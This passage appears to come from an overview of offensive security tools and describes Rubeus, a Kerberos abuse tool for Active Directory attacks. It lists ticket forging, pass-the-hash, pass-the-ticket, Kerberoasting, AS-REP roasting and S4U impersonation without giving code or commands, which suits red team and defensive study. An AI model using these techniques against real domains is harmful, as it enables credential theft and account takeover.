focused primarily on Kerberos abuse. It extends and enhances many of the Kerberos-related capabilities found in Mimikatz but is specialized in this area.
Key Features:

    Ticket Management: Handles Kerberos tickets, including extracting, importing, renewing, and forging tickets.
    Overpass-the-Hash (Pass-the-Key): Uses NTLM hashes to request Kerberos TGTs.
    Pass-the-Ticket: Injects Kerberos tickets into memory for use in authenticated sessions.
    Kerberoasting: Extracts service account tickets from the domain controller that can be cracked offline to reveal service account passwords.
    AS-REP Roasting: Requests Kerberos AS-REP responses for user accounts that do not require pre-authentication, which can be cracked offline.
    S4U (Services for User): Abuses Kerberos extensions to impersonate users without needing their password.

Use Case: Rubeus is particularly useful for red team operations focusing on Kerberos ticket extraction and manipulation, making it an excellent tool for scenarios involving Active Directory attacks.
